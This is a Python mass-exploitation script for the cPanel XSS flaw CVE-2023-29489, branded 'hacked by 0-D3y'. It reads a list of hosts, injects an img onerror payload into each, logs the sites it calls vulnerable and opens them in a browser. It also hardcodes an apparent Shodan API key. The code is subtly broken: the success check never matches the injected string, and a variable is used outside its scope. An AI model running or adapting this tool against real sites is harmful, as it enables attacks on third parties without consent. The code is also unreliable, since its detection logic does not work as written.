import shodan
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import platform
import socket
import webbrowser
import pyfiglet

YE_X = 'tt2P5vHq83hdJTG69YK9ffdsZLboHqquDd1t'

# ANSI color codes
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
RESET = "\033[0m"

if platform.system() == 'Windows':
    os.system(f'title Exploit XSS CVE-2023-29489  - By 0-D3y')

not_exploit = 0
exploit = 0
error_connect = 0

def logo_start():
    if platform.system() == 'Linux':
        os.system('clear')
    if platform.system() == 'Windows':
        os.system('cls')
    
    logo = pyfiglet.figlet_format("CVE-2023-29489", font="slant")
    print(f"{RED}{logo}{RESET}")
    print(f"{YELLOW}                             By : Mr.Sami{RESET}\n")

def search_cpanel_hosts(api_key):
    hosts = input(f"\n\n{RED}╔═══[ ENTER URL LIST ]\n╚══>>>  {RESET}")
    print("\r")
    file_site = open(hosts, 'r').read().splitlines()
    for host in file_site:
        host = host.replace("https://", "").replace("http://", "").replace("/", "")
        if host:
            yield host

def test_xss(url):
    hacked = """/cpanelwebcall/<img%20src=x%20onerror="prompt('0-D3y')">hacked%20by%200-D3y"""
    xss_url = urljoin(url, hacked)
    
    response = requests.get(xss_url, verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    img_tags = soup.find_all('img', src='x')
    
    for img_tag in img_tags:
        if 'onerror' in img_tag.attrs and img_tag['onerror'] == "prompt(0-D3y)":
            return True
    return False

if __name__ == '__main__':
    logo_start()
    for host in search_cpanel_hosts(YE_X):
        for protocol in ['http', 'https']:
            url = f'{protocol}://{host}'
            ip = socket.gethostbyname(host)
            try:
                if test_xss(url):
                    print(f'{MAGENTA}[+]{GREEN} Exploit XSS >>>{WHITE} {url} ~ {ip}{RESET}')
                    exploit += 1
                    if platform.system() == 'Windows':
                        os.system(f'title Exploit XSS - ({exploit}) Not Exploit - ({not_exploit}) Error - ({error_connect})  - By 0-D3y')
                    xss_file = open("CVE-2023-29489.txt", "a")
                    xss_file.write(f"{url}{hacked}\n")
                    xss_file.close()
                    webbrowser.open(f"{url}{hacked}")
                else:
                    print(f'{MAGENTA}[+]{RED} Not Exploit >>>{WHITE} {url} ~ {ip}{RESET}')
                    not_exploit += 1
                    if platform.system() == 'Windows':
                        os.system(f'title Exploit XSS - ({exploit}) Not Exploit - ({not_exploit}) Error - ({error_connect})  - By 0-D3y')
            except Exception as e:
                print(f'{RED}[!] Error Exploit >>> {url} ~ {ip} !!{RESET}')
                error_connect += 1
                if platform.system() == 'Windows':
                    os.system(f'title Exploit XSS - ({exploit}) Not Exploit - ({not_exploit}) Error - ({error_connect})  - By 0-D3y')
